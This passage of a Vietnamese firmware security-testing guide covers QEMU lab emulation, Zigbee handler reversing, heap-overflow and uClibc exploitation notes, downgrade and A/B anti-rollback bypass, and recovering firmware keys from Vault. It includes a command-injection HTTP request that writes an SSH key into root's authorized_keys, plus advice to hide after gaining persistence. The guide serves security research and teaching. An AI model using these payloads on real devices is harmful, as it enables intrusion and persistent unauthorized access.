Giữ nguyên chính xác các phép tính của firmware. Cụ thể, hãy xác định độ dài được tính bằng byte, sector 512 byte hay trang 4 KiB; tái tạo các phép dịch bit và cắt cụt theo đúng thứ tự ban đầu; đồng thời tính đến các vùng đuôi phụ thuộc vào bank trong bố cục A/B. Ví dụ, `(partition_bytes >> 12) << 3` trước tiên cắt cụt về ranh giới 4 KiB, rồi mới biểu diễn kết quả dưới dạng sector 512 byte; thay bằng `partition_bytes // 512` có thể làm dịch chuyển extent được nối thêm vài kilobyte và làm hỏng mọi bảng SquashFS phía sau.<sup>[[11]](#references)</sup>

Quy trình xác thực hữu ích gồm:<sup>[[11]](#references)</sup>

1. Từ binary verifier/init, xác định thiết bị nguồn, sector bắt đầu và độ dài của từng segment `dm-linear`.
2. Nối hoặc ánh xạ các extent mà không làm thay đổi quy tắc căn chỉnh.
3. Nếu vẫn không trích xuất được, chỉ tìm trong một vùng nhỏ quanh ranh giới dự đoán và yêu cầu nhiều cấu trúc metadata hợp lệ liên tiếp, thay vì chỉ chấp nhận một superblock có vẻ hợp lý.
4. Chạy `unsquashfs` nguyên bản trên image đã tái tạo; duyệt thành công tất cả directory và fragment là bằng chứng thuyết phục hơn `unsquashfs -stat`.

#### Thay thế dm-verity do nhà phân tích kiểm soát

Khi nhà phân tích kiểm soát kernel QEMU, initramfs và các đĩa ảo, có thể khởi động root đã chỉnh sửa bằng cách thay PID 1 xác minh của nhà cung cấp bằng một init nhỏ được liên kết tĩnh. Đây là **thay thế boot-chain trong phòng lab**, không phải phá vỡ dm-verity, chữ ký RSA, Secure Boot hay khóa được niêm phong bằng TPM.<sup>[[11]](#references)</sup>

Init thay thế nên mô phỏng các phần vận hành trong đường dẫn khởi động ban đầu: mount `devtmpfs`, gọi `setsid()`, kết nối `/dev/console` với các file descriptor 0–2, mount `/proc` và `/sys`, chờ block device được cung cấp, mount root đã chỉnh sửa ở chế độ chỉ đọc, detach các pseudo-filesystem của root cũ, chuyển mount mới sang `/`, gọi `chroot`, rồi `execve()` `/sbin/init` gốc của firmware. Detach `/dev`, `/proc` và `/sys` **trước** `MS_MOVE` giúp tránh vô tình detach các mount point thuộc root mới.<sup>[[11]](#references)</sup>

Giữ trạng thái thiết bị có thể thay đổi tách biệt với root bất biến đã chỉnh sửa. Overlay qcow2 có thể giữ nguyên trạng thái LVM của đĩa gốc, trong khi một đĩa virtio chỉ đọc thứ hai cung cấp SquashFS đã chỉnh sửa:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Gỡ lỗi trạng thái image ngoại tuyến

Kiểm tra trạng thái lưu trữ bên ngoài guest khi quá trình khởi động chậm, các script khởi động phá hoại hoặc nhật ký console không đáng tin cậy che khuất nguyên nhân lỗi. Không bao giờ gắn overlay mà một VM đang chạy sử dụng; hiển thị nó bằng `qemu-nbd`, giới hạn việc phát hiện LVM vào phân vùng NBD dự kiến và vô hiệu hóa volume group trước khi ngắt kết nối.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Để cô lập lỗi có thể lặp lại, hãy ghi các tệp đánh dấu có dấu thời gian vào một volume ổn định có quyền ghi và xác minh chúng khi offline; `/dev/kmsg`, FIFO và console tạm thời có thể gây kết quả âm tính giả do giới hạn tốc độ hoặc tiến trình chết sớm. Ngoài ra, hãy so sánh chính xác các giao diện giữa các lớp trước khi thay đổi code không liên quan: `uname -r` so với `/lib/modules/`, các tính năng ext4 trên đĩa so với cấu hình kernel, và thế hệ Mesa `libGL` so với ABI của driver DRI và tên driver suy ra từ PCI. Một thành phần có thể tồn tại, thậm chí `dlopen()` thành công, nhưng vẫn không dùng được vì thành phần sử dụng nó yêu cầu ABI khác.<sup>[[11]](#references)</sup>

## Phân tích động trong thực tế

Ở giai đoạn này, môi trường thiết bị thực hoặc giả lập được dùng để phân tích. Điều thiết yếu là duy trì quyền truy cập shell vào OS và filesystem. Giả lập có thể không mô phỏng chính xác các tương tác phần cứng, nên đôi khi cần khởi động lại môi trường giả lập. Quá trình phân tích nên xem xét lại filesystem, khai thác các trang web và dịch vụ mạng bị lộ, cũng như khám phá các lỗ hổng bootloader. Các bài kiểm tra tính toàn vẹn firmware rất quan trọng để xác định các lỗ hổng backdoor tiềm ẩn.

## Kỹ thuật phân tích thời gian chạy

Phân tích thời gian chạy bao gồm việc tương tác với một tiến trình hoặc binary trong môi trường hoạt động của nó, sử dụng các công cụ như gdb-multiarch, Frida và Ghidra để đặt breakpoint và xác định lỗ hổng thông qua fuzzing cùng các kỹ thuật khác.

Với các mục tiêu nhúng không có debugger đầy đủ, **hãy sao chép một `gdbserver` được liên kết tĩnh** vào thiết bị rồi kết nối từ xa:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Ánh xạ thông điệp Zigbee / radio-co-processor

Trên các hub IoT, RF stack thường được phân chia giữa **radio MCU** và một tiến trình userland Linux. Một quy trình hữu ích là ánh xạ đường đi:<sup>[[8]](#references)</sup>

1. **RF frame** truyền qua không khí
2. **Parser phía controller** trên radio MCU
3. **Giao thức văn bản hoặc TLV qua serial/UART** được chuyển tiếp đến Linux (ví dụ `/dev/tty*`)
4. **Application dispatcher** trong daemon chính
5. **Protocol-specific handler / state machine**

Kiến trúc này tạo ra hai mục tiêu reverse thay vì một. Nếu controller chuyển các RF frame nhị phân thành giao thức dạng văn bản như `Group,Command,arg1,arg2,...`, hãy xác định:

- **Các nhóm thông điệp** và bảng dispatch
- Thông điệp nào có thể đến từ **network** so với chính controller
- Các **trường phân biệt dành riêng cho nhà sản xuất** chính xác (ví dụ Zigbee `manufacturer_code` và `cluster_command` tùy chỉnh)
- Handler nào chỉ có thể truy cập trong các giai đoạn **commissioning**, discovery hoặc tải firmware/model

Riêng với Zigbee, hãy ghi lại lưu lượng pairing và kiểm tra xem mục tiêu có còn dùng **Link Key** mặc định `ZigBeeAlliance09` hay không. Nếu có, việc sniff lưu lượng commissioning có thể làm lộ **Network Key**. Zigbee 3.0 install codes giúp giảm nguy cơ này, vì vậy hãy ghi nhận thiết bị được kiểm thử có thực sự bắt buộc sử dụng chúng hay không.

### Handler giao thức riêng của nhà sản xuất và khả năng truy cập bị giới hạn bởi FSM

Các lệnh Zigbee/ZCL riêng của nhà sản xuất thường là mục tiêu tốt hơn các cluster chuẩn hóa vì chúng đi vào **mã parsing tùy chỉnh** và **FSM** nội bộ, vốn ít được kiểm thử độ an toàn hơn.<sup>[[8]](#references)</sup>

Quy trình thực tế:

- Reverse command dispatcher cho đến khi tìm thấy **handler chỉ dành cho nhà sản xuất**.
- Khôi phục các bảng **trạng thái FSM**, **event**, **check**, **action** và **trạng thái tiếp theo**.
- Xác định các **trạng thái chuyển tiếp** tự động tiến tiếp, cùng các nhánh retry/error cuối cùng sẽ reset hoặc giải phóng state do attacker kiểm soát.
- Xác nhận những trao đổi giao thức hợp lệ nào cần thiết để đưa daemon vào trạng thái dễ bị tấn công, thay vì mặc định rằng handler lỗi luôn có thể truy cập.

Với các giao thức nhạy cảm về thời gian, phát lại packet từ một framework Python có thể quá chậm. Cách đáng tin cậy hơn là giả lập một thiết bị hợp lệ trên phần cứng thật (ví dụ **nRF52840**) với stack cấp độ nhà sản xuất để có thể cung cấp đúng **endpoints**, **attributes** và thời điểm commissioning.

### Lớp lỗi tải xuống phân mảnh trong daemon nhúng

Một lớp lỗi firmware thường gặp xuất hiện trong các thao tác tải xuống **blob/model/configuration phân mảnh**:<sup>[[8]](#references)</sup>

1. **Fragment đầu tiên** (`offset == 0`) lưu `ctx->total_size` và cấp phát `malloc(total_size)`.
2. Các fragment sau chỉ kiểm tra những trường **riêng của packet** do attacker kiểm soát, chẳng hạn `packet_total_size >= offset + chunk_len`.
3. Thao tác sao chép dùng `memcpy(&ctx->buffer[offset], chunk, chunk_len)` mà không kiểm tra giới hạn **kích thước đã cấp phát ban đầu**.

Điều này cho phép attacker gửi:

- Một fragment hợp lệ đầu tiên có kích thước khai báo **nhỏ** để buộc cấp phát một vùng heap nhỏ.
- Một fragment sau đó có **offset dự kiến** nhưng `chunk_len` lớn hơn.
- Kích thước riêng của packet giả mạo thỏa mãn các bước kiểm tra mới, nhưng vẫn làm tràn buffer đã cấp phát ban đầu.

Khi đường xử lý dễ bị tấn công nằm sau logic commissioning, quá trình khai thác phải bao gồm đủ **giả lập thiết bị** để đưa mục tiêu vào trạng thái tải model hoặc blob dự kiến trước khi gửi các fragment sai định dạng.

### Kích hoạt `free()` thông qua giao thức

Trong daemon nhúng, cách dễ nhất để kích hoạt khai thác heap metadata thường không phải là “chờ dọn dẹp” mà là **buộc cơ chế xử lý lỗi của chính giao thức hoạt động**:<sup>[[8]](#references)</sup>

- Gửi các fragment tiếp theo sai định dạng để đẩy FSM vào trạng thái **retry** hoặc **error**.
- Vượt ngưỡng retry để daemon **reset context** và giải phóng buffer đã bị làm hỏng.
- Dùng lệnh `free()` có thể dự đoán này để kích hoạt các primitive phía allocator trước khi tiến trình gặp sự cố vì nguyên nhân khác.

Điều này đặc biệt hữu ích khi tấn công các allocator dạng **musl/uClibc/dlmalloc** trên Linux nhúng, nơi việc làm hỏng chunk metadata có thể biến logic unlink/unbin thành primitive ghi. Một cách ổn định là làm hỏng **trường size** để chuyển hướng quá trình duyệt allocator đến **fake chunk được bố trí bên trong buffer bị tràn**, thay vì lập tức ghi đè các bin pointer thật và làm tiến trình gặp sự cố.

## Khai thác nhị phân và Proof-of-Concept

Phát triển PoC cho các lỗ hổng đã xác định đòi hỏi hiểu biết sâu về kiến trúc mục tiêu và khả năng lập trình bằng các ngôn ngữ cấp thấp. Các cơ chế bảo vệ runtime nhị phân hiếm gặp trong hệ thống nhúng, nhưng khi có, có thể cần đến các kỹ thuật như Return Oriented Programming (ROP).

### Ghi chú khai thác uClibc fastbin (Linux nhúng)

- **Fastbin + consolidation:** uClibc dùng fastbin tương tự glibc. Một lần cấp phát lớn sau đó có thể kích hoạt `__malloc_consolidate()`, vì vậy mọi fake chunk phải vượt qua các bước kiểm tra (size hợp lệ, `fd = 0` và các chunk xung quanh được xem là “đang sử dụng”).<sup>[[6]](#references)</sup>
- **Binary non-PIE khi bật ASLR:** nếu ASLR được bật nhưng binary chính là **non-PIE**, các địa chỉ `.data/.bss` bên trong binary ổn định. Có thể nhắm đến một vùng đã có dạng giống header heap chunk hợp lệ để đưa một lần cấp phát fastbin vào **bảng function pointer**.
- **NUL làm dừng parser:** khi JSON được parse, `\x00` trong payload có thể dừng quá trình parsing trong khi vẫn giữ lại các byte phía sau do attacker kiểm soát để dùng cho stack pivot/ROP chain.
- **Shellcode qua `/proc/self/mem`:** ROP chain gọi `open("/proc/self/mem")`, `lseek()` và `write()` có thể ghi shellcode thực thi vào một mapping đã biết rồi nhảy đến đó.

## Hệ điều hành được chuẩn bị sẵn để phân tích firmware

Các hệ điều hành như [AttifyOS](https://github.com/adi0x90/attifyos) và [EmbedOS](https://github.com/scriptingxss/EmbedOS) cung cấp môi trường được cấu hình sẵn để kiểm thử bảo mật firmware, trang bị các công cụ cần thiết.

## Các OS được chuẩn bị sẵn để phân tích firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS là một distro nhằm hỗ trợ bạn đánh giá bảo mật và pentesting các thiết bị Internet of Things (IoT). Hệ điều hành này giúp tiết kiệm nhiều thời gian bằng cách cung cấp môi trường cấu hình sẵn với đầy đủ công cụ cần thiết.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Hệ điều hành kiểm thử bảo mật nhúng dựa trên Ubuntu 18.04, được cài sẵn các công cụ kiểm thử bảo mật firmware.

## Tấn công hạ cấp firmware và cơ chế cập nhật không an toàn

Ngay cả khi nhà sản xuất triển khai kiểm tra chữ ký mật mã cho firmware image, **cơ chế bảo vệ rollback phiên bản (downgrade) thường bị bỏ qua**. Khi bootloader hoặc recovery loader chỉ xác minh chữ ký bằng public key được nhúng nhưng không so sánh *phiên bản* (hoặc bộ đếm đơn điệu) của image được flash, attacker có thể cài đặt hợp lệ một **firmware cũ hơn, dễ bị tấn công nhưng vẫn có chữ ký hợp lệ**, qua đó đưa các lỗ hổng đã được vá trở lại thiết bị.<sup>[[4]](#references)</sup>

Quy trình tấn công điển hình:

1. **Lấy một image cũ có chữ ký**
   * Tải từ cổng tải xuống công khai, CDN hoặc trang hỗ trợ của nhà sản xuất.
   * Trích xuất từ ứng dụng di động/desktop đi kèm (ví dụ bên trong Android APK tại `assets/firmware/`).
   * Lấy từ các kho lưu trữ bên thứ ba như VirusTotal, Internet archives, forum, v.v.
2. **Tải image lên hoặc cung cấp image cho thiết bị** qua bất kỳ kênh cập nhật nào có thể truy cập:
   * Web UI, API của ứng dụng di động, USB, TFTP, MQTT, v.v.
   * Nhiều thiết bị IoT tiêu dùng cung cấp các endpoint HTTP(S) *không cần xác thực*, chấp nhận firmware blob được mã hóa Base64, giải mã ở phía server rồi kích hoạt khôi phục/cập nhật.
3. Sau khi downgrade, khai thác một lỗ hổng đã được vá trong phiên bản mới hơn (ví dụ bộ lọc command-injection được bổ sung sau này).
4. Tùy chọn flash lại image mới nhất hoặc tắt cập nhật để tránh bị phát hiện sau khi giành được persistence.

### Ví dụ: Command Injection sau khi downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

Trong firmware dễ bị tấn công (đã downgrade), tham số `md5` được nối trực tiếp vào lệnh shell mà không qua bước làm sạch, cho phép injection các lệnh tùy ý (ở đây là bật quyền truy cập root bằng SSH key). Các phiên bản firmware sau này đã bổ sung bộ lọc ký tự cơ bản, nhưng việc không có cơ chế bảo vệ downgrade khiến bản sửa lỗi trở nên vô nghĩa.<sup>[[4]](#references)</sup>

### Trích xuất Firmware từ ứng dụng di động

Nhiều nhà cung cấp đóng gói toàn bộ firmware image bên trong ứng dụng di động đi kèm để ứng dụng có thể cập nhật thiết bị qua Bluetooth/Wi-Fi. Các gói này thường được lưu trữ không mã hóa trong APK/APEX, tại các đường dẫn như `assets/fw/` hoặc `res/raw/`. Các công cụ như `apktool`, `ghidra`, hoặc thậm chí `unzip` thuần túy cho phép bạn lấy các image đã ký mà không cần tiếp xúc với phần cứng vật lý.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Bypass anti-rollback chỉ có trong updater ở thiết kế khe A/B

Một số nhà cung cấp có triển khai **ratchet** chống hạ cấp, nhưng chỉ trong logic của *updater* (ví dụ: một routine UDS qua CAN, lệnh recovery hoặc OTA agent trong userspace). Nếu **bootloader** sau đó chỉ kiểm tra chữ ký/CRC của image và tin cậy bảng phân vùng hoặc metadata của slot, thì vẫn có thể bypass cơ chế bảo vệ rollback.<sup>[[7]](#references)</sup>

Thiết kế yếu thường gặp:

- Metadata firmware chứa cả bộ mô tả phiên bản lẫn **security ratchet** / bộ đếm đơn điệu.
- Updater so sánh ratchet của image với giá trị được lưu trong bộ nhớ bền vững và từ chối các image cũ hơn đã được ký.
- Bootloader **không** phân tích ratchet đó, mà chỉ xác minh header, CRC và chữ ký trước khi khởi động slot được chọn.
- Việc kích hoạt slot được lưu riêng trong bảng phân vùng hoặc bộ đếm generation theo từng slot và **không được ràng buộc bằng mật mã** với digest chính xác của firmware đã được xác thực.

Điều này tạo ra primitive **xác thực một image / khởi động image khác** trong các hệ thống dual-slot. Nếu kẻ tấn công có thể khiến updater đánh dấu slot B là mục tiêu khởi động tiếp theo bằng một image hiện hành đã ký, rồi ghi đè slot B trước khi reboot, bootloader vẫn có thể khởi động image đã bị hạ cấp vì nó chỉ tin metadata của slot đã được commit.

Mẫu lạm dụng phổ biến:

1. Tải firmware **hiện hành đã ký** vào slot thụ động rồi chạy routine xác thực/chuyển đổi bình thường để layout đánh dấu slot đó là slot hoạt động tiếp theo.
2. **Chưa reboot**. Trong cùng session, gọi lại routine chuẩn bị/xóa slot.
3. Lợi dụng trạng thái khởi động cũ hoặc logic chọn slot cũ để updater xóa **cùng slot vật lý** vừa được nâng thành slot hoạt động tiếp theo.
4. Ghi firmware **cũ hơn nhưng vẫn được ký** vào slot đó.
5. Bỏ qua routine xác thực thực thi ratchet và reboot trực tiếp.
6. Bootloader chọn slot vừa được nâng thành slot hoạt động, chỉ xác minh chữ ký/tính toàn vẹn rồi khởi động image cũ.

Những điểm cần tìm khi reverse các triển khai cập nhật A/B:

- Việc chọn slot dựa trên **các cờ lúc khởi động** không được làm mới sau khi chuyển đổi thành công.
- Routine kiểu `prepare_passive_slot()` xóa slot dựa trên trạng thái cũ thay vì **layout hiện được commit**.
- Hàm kiểu `part_write_layout()` chỉ tăng **generation counter** / cờ active mà không lưu hash của image đã được xác thực.
- Các kiểm tra ratchet được triển khai trong userspace hoặc mã updater, nhưng **không có** trong ROM / bootloader / các giai đoạn secure boot.
- Các routine xóa hoặc recovery vẫn để slot được đánh dấu là có thể khởi động, ngay cả sau khi nội dung của slot bị xóa rồi ghi lại.

### Danh sách kiểm tra khi đánh giá logic cập nhật

* Kênh truyền tải/xác thực của *update endpoint* có được bảo vệ đầy đủ không (TLS + xác thực)?
* Thiết bị có so sánh **số phiên bản** hoặc **bộ đếm anti-rollback đơn điệu** trước khi flash không?
* Image có được xác minh trong secure boot chain không (ví dụ: chữ ký được kiểm tra bằng mã ROM)?
* **Bootloader có thực thi cùng ratchet** như updater không, hay chỉ kiểm tra chữ ký/CRC?
* Metadata kích hoạt slot có được **ràng buộc với digest/phiên bản firmware đã xác thực** không, hay slot có thể bị sửa đổi sau khi được nâng thành slot hoạt động?
* Sau khi chuyển đổi slot thành công, thiết bị có buộc phải reboot không, hay các routine cập nhật/xóa khác vẫn có thể được gọi trong cùng session?
* Mã userland có thực hiện thêm các kiểm tra hợp lệ không (ví dụ: sơ đồ phân vùng được phép, số model)?
* Các luồng cập nhật *một phần* hoặc *sao lưu* có dùng lại cùng logic xác thực không?

> 💡  Nếu thiếu bất kỳ mục nào ở trên, nền tảng có thể dễ bị tấn công rollback.

## Firmware dễ bị tấn công để thực hành

Để thực hành tìm lỗ hổng trong firmware, hãy bắt đầu với các dự án firmware dễ bị tấn công sau đây.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- Dự án Damn Vulnerable Router Firmware
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Khôi phục khóa giải mã firmware từ trạng thái KMS/Vault nhúng

Khi một image cập nhật kết hợp metadata plaintext dung lượng nhỏ với một blob entropy cao dung lượng lớn, hãy phân tích sơ bộ container trước khi thử brute-force bất cứ thứ gì:<sup>[[1]](#references)</sup>

- Dump header, offset và ranh giới dòng bằng `hexdump`, `xxd`, `strings -tx`, `base64 -d` và `binwalk -E`.
- `Salted__` thường cho biết định dạng OpenSSL `enc`: 8 byte tiếp theo là salt, phần còn lại là ciphertext.
- Một trường Base64 khi giải mã có đúng `256` byte là dấu hiệu rõ ràng cho thấy bạn đang xem ciphertext RSA-2048 dùng để bọc mật khẩu firmware/khóa phiên ngẫu nhiên.
- PGP material tách rời trong cùng file thường chỉ bảo vệ tính xác thực; đừng cho rằng nó là cơ chế bảo mật thông tin.

Nếu việc tìm khóa tĩnh (`grep`, `strings`, tìm kiếm PEM/PGP) không hiệu quả, hãy reverse **đường đi giải mã trong quá trình vận hành** thay vì chỉ tìm khóa riêng:

- Decompile updater / binary quản lý và lần theo thành phần đọc blob được mã hóa, helper/API nào mở khóa blob đó và tên khóa logic mà nó yêu cầu.
- Tìm trong root filesystem đã trích xuất các trạng thái KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), cùng các unit file và init script.
- Coi plaintext `vault operator unseal ...`, khóa recovery, bootstrap token hoặc script tự động unseal KMS cục bộ tương đương với material khóa riêng.

Nếu appliance đi kèm binary Vault gốc và storage backend, việc chạy lại môi trường đó thường dễ hơn triển khai lại các thành phần nội bộ của Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Với quyền root trên KMS đã clone:

- Chỉ cho phép export transit key trong bản clone cô lập: `vault write transit/keys/<name>/config exportable=true`
- Export unwrap key: `vault read transit/export/encryption-key/<name>`
- Thử RSA key đã khôi phục với đúng cặp padding/hash mà KMS sử dụng. Giải mã PKCS#1 v1.5 thất bại và giải mã OAEP mặc định thất bại **không** chứng minh key sai; nhiều luồng được Vault hỗ trợ dùng OAEP với SHA-256, trong khi các thư viện phổ biến mặc định dùng SHA-1.
- Nếu payload bắt đầu bằng `Salted__`, hãy tái tạo chính xác KDF OpenSSL của nhà cung cấp (`EVP_BytesToKey`, thường dùng MD5 trên các thiết bị đời cũ) trước khi thử giải mã AES-CBC.

Như vậy, vấn đề “firmware được mã hóa” trở thành một bài toán tổng quát hơn: **khôi phục các operational key phía appliance, rồi tái tạo chính xác các tham số unwrap + KDF ngoại tuyến**.

## Đào tạo và Chứng chỉ

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Cracking Firmware with Claude: Kỹ năng cấp cao cấp, khả năng tự chủ cấp thấp](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Phương pháp kiểm thử bảo mật firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Thực hành IoT Hacking: Hướng dẫn toàn diện về tấn công Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Khai thác zero-day trên phần cứng bị bỏ rơi – blog Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Một thiết bị thông minh giá 20 đô la đã giúp tôi truy cập vào nhà bạn như thế nào](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Giờ bạn thấy mi: Giờ bạn đã bị pwn](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Khai thác Tesla Wall Connector qua cổng kết nối sạc - Phần 2: vượt qua cơ chế chống hạ cấp](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Làm cho đèn nhấp nháy: Khai thác Philips Hue Bridge qua mạng không dây](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS trên QEMU Phần 1: Giải nén](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Tài liệu Linux kernel - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [ROOT Tesla OS trên QEMU Phần 2: Gỡ lỗi và sửa lỗi](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Mật khẩu BIOS Dell: Mã hóa XOR yếu cho phép khôi phục từ SPI Flash (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Công cụ khôi phục mật khẩu BIOS Dell](https://github.com/R3n5k1/dellpwn)
- [14] [VoidStar Security — Ôn lại Hardware Hacking Phần 2](https://voidstarsec.com/blog/brushing-up-part-2)
- [15] [Cách thức và lý do chúng tôi hack ví phần cứng Cypherock: Toàn bộ câu chuyện](https://www.darknavy.org/blog/how_and_why_we_hacked_cypherock_hardware_wallet_the_full_story/)
{{#include ../../banners/hacktricks-training.md}}
